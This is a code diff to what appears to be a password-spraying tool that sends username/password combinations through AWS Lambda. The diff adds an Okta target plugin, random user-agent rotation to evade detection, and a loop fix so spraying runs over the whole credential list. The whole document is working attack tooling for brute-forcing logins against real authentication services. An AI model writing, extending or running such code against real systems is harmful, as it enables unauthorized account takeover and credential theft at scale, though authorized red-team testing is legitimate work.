@@ -34,12 +34,17 @@ def main(args):
 	password_file = args.passwordfile
 	access_key = args.access_key
 	secret_access_key = args.secret_access_key
+	okta_domain = args.oktadomain
+	if plugin.lower() == "okta" and okta_domain is None:
+		log_entry('Error: Okta plugin selected but domain was not supplied, provide the target domain with --oktadomain myorg.okta.com')
+		return
+	useragent_file = args.useragentfile
 
 	start_time = datetime.datetime.utcnow()
 	log_entry('Execution started at: {}'.format(start_time))
 
 	# Prepare credential combinations into the queue
-	load_credentials(username_file, password_file)
+	load_credentials(username_file, password_file, useragent_file)
 
 	# Prepare the deployment package
 	zip_path = create_zip(plugin)
@@ -59,6 +64,7 @@ def main(args):
 				access_key=access_key,
 				secret_access_key=secret_access_key,
 				arn=arn,
+				okta_domain=okta_domain
 			)
 
 
@@ -90,9 +96,9 @@ def display_stats(start=True):
 		log_entry('Total Execution: {} seconds'.format(time_lapse))
 
 
-def start_spray(access_key, secret_access_key, arn):
+def start_spray(access_key, secret_access_key, arn, okta_domain=None):
 	while True:
-		item = q.get()
+		item = q.get_nowait()
 
 		if item is None:
 			break
@@ -100,6 +106,9 @@ def start_spray(access_key, secret_access_key, arn):
 		payload = {}
 		payload['username'] = item['username']
 		payload['password'] = item['password']
+		payload['useragent'] = item['useragent']
+		if okta_domain is not None:
+			payload['domain'] = okta_domain
 
 		invoke_lambda(
 			access_key=access_key,
@@ -109,7 +118,6 @@ def start_spray(access_key, secret_access_key, arn):
 		)
 
 		q.task_done()
-		break
 
 
 def clear_credentials(username, password):
@@ -123,17 +131,22 @@ def clear_credentials(username, password):
 	credentials = c
 
 
-def load_credentials(user_file, password_file):
+def load_credentials(user_file, password_file,useragent_file=None):
 	log_entry('Loading credentials from {} and {}'.format(user_file, password_file))
 
 	users = load_file(user_file)
 	passwords = load_file(password_file)
+	if useragent_file is not None:
+		useragents = load_file(useragent_file)
+	else:
+		useragents = ["Python CredKing (https://github.com/ustayready/CredKing)"]
 
 	for user in users:
 		for password in passwords:
 			cred = {}
 			cred['username'] = user
 			cred['password'] = password
+			cred['useragent'] = random.choice(useragents)
 			credentials['accounts'].append(cred)
 
 	for cred in credentials['accounts']:
@@ -399,8 +412,9 @@ if __name__ == '__main__':
 		type=int, default=1)
 	parser.add_argument('--userfile', help='username file', required=True)
 	parser.add_argument('--passwordfile', help='password file', required=True)
+	parser.add_argument('--useragentfile', help='useragent file', required=False)
 	parser.add_argument('--access_key', help='aws access key', required=True)
 	parser.add_argument('--secret_access_key', help='aws secret access key', required=True)
-
+	parser.add_argument('--oktadomain', help='Okta domain (Okta plugin only)', required=False)
 	args = parser.parse_args()
 	main(args)
